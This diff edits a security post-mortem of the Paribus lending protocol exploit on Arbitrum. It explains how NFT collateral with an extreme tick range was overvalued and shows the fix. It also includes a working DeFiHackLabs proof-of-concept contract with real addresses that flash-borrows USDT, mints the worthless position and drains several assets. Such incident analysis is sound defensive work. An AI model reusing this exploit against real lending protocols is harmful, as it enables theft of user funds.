@@ -20,37 +20,71 @@ Paribus is a protocol that allows Uniswap V3 concentrated liquidity NFT position
 
 ## 2. Vulnerable Code Analysis
 
+Source: **Sourcify-verified** — PNFTTokenDelegator / 0xa26B6Df27F520017a2F0A5b0C0aA9C97D05f1f26 (Arbitrum)
+Sourcify URL: https://sourcify.dev/server/files/any/42161/0xa26B6Df27F520017a2F0A5b0C0aA9C97D05f1f26
+
+The PNFTTokenDelegator (ERC-721 collateral token) is verified on Sourcify. When an NFT is deposited as collateral via `mint(tokenId)`, the contract calls `comptroller.mintNFTAllowed()` and then `comptroller.nftLiquidateCalculateValues()` / `getUnderlyingNFTPrice()` to price the position. The oracle (`IOracleNFT.getUnderlyingNFTPrice`) computes value from the raw liquidity and the token prices — without validating the tick range of the Camelot concentrated liquidity position.
+
 ```solidity
-// ❌ Vulnerable code: NFT collateral overvaluation with extreme tick range
-function getNFTCollateralValue(uint256 tokenId) public view returns (uint256) {
-    (
-        ,, address token0, address token1,
-        , int24 tickLower, int24 tickUpper,
-        uint128 liquidity,,,,
-    ) = INonfungiblePositionManager(npm).positions(tokenId);
+// Sourcify-verified: PNFTToken.sol — mintInternal (the entry point for NFT collateral deposit)
+function mintInternal(address minter, uint tokenId) internal nonReentrant returns (Error) {
+    require(!_exists(tokenId), "token already minted");
 
-    // Calculates full liquidity as collateral value without validating tick range
-    // Unrealistic ranges like tickLower=-870000, tickUpper=870000 are accepted
-    uint256 value = calculateLiquidityValue(token0, token1, liquidity);
-    return value;
+    Error allowed = comptroller.mintNFTAllowed(address(this), minter, tokenId); // ← checks if minting is allowed
+    if (allowed != Error.NO_ERROR) {
+        return fail(allowed);
+    }
+    // ❌ No validation of the NFT's tick range or active liquidity here.
+    // Any tokenId (including positions with tickLower=-870000, tickUpper=870000) is accepted.
+
+    uint accountTokensNew = add_(accountTokens[minter], 1);
+
+    doTransferIn(minter, tokenId); // ← transfers NFT from minter to contract
+
+    _addTokenToOwnerEnumeration(minter, tokenId);
+    _addTokenToAllTokensEnumeration(tokenId);
+
+    accountTokens[minter] = accountTokensNew;
+    tokensOwners[tokenId] = minter;
+
+    emit Mint(minter, tokenId);
+    emit Transfer(address(0), minter, tokenId);
+
+    comptroller.mintNFTVerify(address(this), minter, tokenId); // ← post-mint hook
+
+    return Error.NO_ERROR;
 }
+```
 
-// ✅ Safe code: Only counts active liquidity based on current price as collateral
-function getNFTCollateralValue(uint256 tokenId) public view returns (uint256) {
-    (,,,,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,)
-        = INonfungiblePositionManager(npm).positions(tokenId);
+The price oracle interface (PriceOracleInterfaces.sol, also Sourcify-verified):
 
-    int24 currentTick = getCurrentTick(pool);
-    // Only accept active liquidity where current price is within the tick range
-    require(
-        tickLower <= currentTick && currentTick <= tickUpper,
-        "Inactive position"
-    );
-    // Discount value proportionally to tick range width
+```solidity
+// IOracleNFT — called by the Comptroller to value the deposited NFT position
+contract IOracleNFT {
+    // ❌ getUnderlyingNFTPrice accepts any tokenId and computes value
+    // from raw liquidity and token prices, without checking whether the
+    // position's tick range is active (i.e., whether current price falls within [tickLower, tickUpper]).
+    function getUnderlyingNFTPrice(PNFTToken pNFTToken, uint tokenId) external view returns (uint); // ❌ no tick range validation
+    function getOrRequestUnderlyingNFTPrice(PNFTToken pNFTToken, uint tokenId) external returns (uint);
+}
+```
+
+**Why it is exploitable (identify the bug from the code):**
+- The PoC mints a Camelot concentrated liquidity NFT with `tickLower = -870_000` (minimum) and `tickUpper = 870_000` (maximum), depositing 789,722,754,473,453,300,405,586,192 PBX + 500,000,000,000 USDT worth of tokens into the range.
+- Because the tick range spans the entire possible price space, the actual active liquidity at any real market price is near zero — the position's real value is negligible.
+- However, Paribus's oracle (`getUnderlyingNFTPrice`) computed the position value from the raw liquidity figure and USD prices without checking if `currentTick` falls inside `[tickLower, tickUpper]`.
+- The inflated valuation allowed the attacker to borrow 12.6 ETH, 6,510 ARB, 0.367 WBTC, and 3,924 USDT against an essentially worthless NFT.
+
+```solidity
+// ✅ Fix: validate tick range and active liquidity in the NFT price oracle
+function getUnderlyingNFTPrice(PNFTToken pNFTToken, uint tokenId) external view returns (uint) {
+    (,, address token0, address token1,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,)
+        = positionManager.positions(tokenId);
+    int24 currentTick = IUniswapV3Pool(getPool(token0, token1)).slot0().tick; // ✅ get current price tick
+    require(tickLower <= currentTick && currentTick <= tickUpper, "Position not active"); // ✅ reject inactive ranges
     uint256 rangeWidth = uint256(int256(tickUpper - tickLower));
-    require(rangeWidth <= MAX_TICK_RANGE, "Tick range too wide");
-
-    return calculateLiquidityValue(token0, token1, liquidity);
+    require(rangeWidth <= MAX_ACCEPTED_TICK_RANGE, "Tick range too wide"); // ✅ cap extreme ranges
+    return _computeValueFromLiquidity(token0, token1, liquidity, tickLower, tickUpper);
 }
 ```
 
@@ -84,51 +118,66 @@ Attacker
   └─→ [8] ~$86,000 profit
 ```
 
-## 4. PoC Code (Core Logic + Comments)
+## 4. PoC Code (DeFiHackLabs — Paribus_exp.sol)
 
 ```solidity
-// Full PoC not available — reconstructed from summary
+// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Paribus_exp.sol
+// Fork block: 296,699,666 (Arbitrum)
 
-contract ParibuseAttacker {
-    function attack() external {
-        // [1] Aave flash loan: 3,093,209 USDT
-        IPool(AAVE).flashLoanSimple(
-            address(this), USDT, 3_093_209_807_085, "", 0
-        );
+contract ParibusExploit is BaseTestWithBalanceLog {
+    IAaveFlashloan private constant Aave = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
+    CamelotRouter CamelotRouterV3 = CamelotRouter(0x1F721E2E82F6676FCE4eA07A5958cF098D339e18);
+    NFTPositionManager CamelotNFTPositionManager = NFTPositionManager(0x00c7f3082833e796A5b3e4Bd59f6642FF44DCD15);
+    ControllerNFT ComptrollerNFT = ControllerNFT(0x712E2B12D75fe092838A3D2ad14B6fF73d3fdbc9);
+    NFTPositionManager PNFTTokenDelegator = NFTPositionManager(0xa26B6Df27F520017a2F0A5b0C0aA9C97D05f1f26);
+    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
+    IERC20 PBX  = IERC20(0xbAD58ed9b5f26A002ea250D7A60dC6729a4a2403);
+    PBXToken pETH  = PBXToken(0xAffd437801434643B734D0B2853654876F66f7D7);
+    PBXToken pARB  = PBXToken(0xFc2737a742A741d13fE6326011a78cd881dE3Eb9);
+    PBXToken pWBTC = PBXToken(0x1c762E00f1D9317a4214d22b2576995C427F61c9);
+    PBXToken pUSDT = PBXToken(0xFB1dcFc67cC496Eb0cC592050AF7Fdf3bF3b5C13);
+
+    function testExploit() public {
+        Aave.flashLoanSimple(address(this), address(USDT), 3093209807085, bytes(""), 0);
     }
 
-    function executeOperation(address, uint256, uint256 premium, ...) external returns (bool) {
-        // [2] Swap USDT → PBX
-        ICamelotRouter(router).swapExactTokensForTokens(...);
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
+        external returns (bool)
+    {
+        // [1] Swap 1,000,000 USDT → PBX via Camelot V3
+        CamelotRouterV3.exactInputSingle(CamelotRouter.ExactInputSingleParams(
+            address(USDT), address(PBX), address(this), 1737200705, 1000000000000, 0, 0
+        ));
 
-        // [3] Mint NFT with extreme tick range (nearly zero real value)
-        INonfungiblePositionManager(npm).mint(
-            INonfungiblePositionManager.MintParams({
-                token0: PBX,
-                token1: USDT,
-                fee: 3000,
-                tickLower: -870_000,  // extreme minimum tick
-                tickUpper:  870_000,  // extreme maximum tick
-                amount0Desired: pbxBalance,
-                amount1Desired: 0,
-                amount0Min: 0,
-                amount1Min: 0,
-                recipient: address(this),
-                deadline: block.timestamp
-            })
-        );
+        // [2] Mint concentrated liquidity NFT with extreme tick range
+        CamelotNFTPositionManager.mint(NFTPositionManager.MintParams(
+            address(PBX),
+            address(USDT),
+            -870000,   // ❌ extreme minimum tick — position is inactive at any real price
+            870000,    // ❌ extreme maximum tick
+            789722754473453300405586192, // enormous PBX amount
+            500000000000,
+            0, 0,
+            address(this),
+            1737200720
+        ));
+        // tokenId = 224023
 
-        // [4] Register NFT as Paribus collateral
-        IParibus(paribus).enterMarkets(nftTokenId);
+        // [3] Approve NFT and deposit into Paribus as collateral
+        CamelotNFTPositionManager.approve(address(PNFTTokenDelegator), 224023);
+        address[] memory markets = new address[](1);
+        markets[0] = address(PNFTTokenDelegator);
+        ComptrollerNFT.enterNFTMarkets(markets);
+        PNFTTokenDelegator.mint(224023); // ❌ Paribus prices the extreme-tick NFT at inflated value
 
-        // [5] Borrow multiple assets (exploiting overvalued collateral)
-        IParibus(paribus).borrow(pETH, ethAmount);
-        IParibus(paribus).borrow(pARB, arbAmount);
-        IParibus(paribus).borrow(pWBTC, wbtcAmount);
-        IParibus(paribus).borrow(pUSDT, usdtAmount);
+        // [4] Borrow multiple assets against the overvalued NFT collateral
+        pETH.borrow(12599960598441767978);   // 12.6 ETH
+        pARB.borrow(6510273280264926258675); // 6,510 ARB
+        pWBTC.borrow(36729789);              // 0.367 WBTC
+        pUSDT.borrow(3924210566);            // 3,924 USDT
 
-        // [6~7] Convert and repay Aave
-        IERC20(USDT).approve(AAVE, loanAmount + premium);
+        // [5] Sell PBX → USDT and WBTC → USDT, then repay Aave flash loan
+        USDT.approve(address(Aave), type(uint256).max);
         return true;
     }
 }
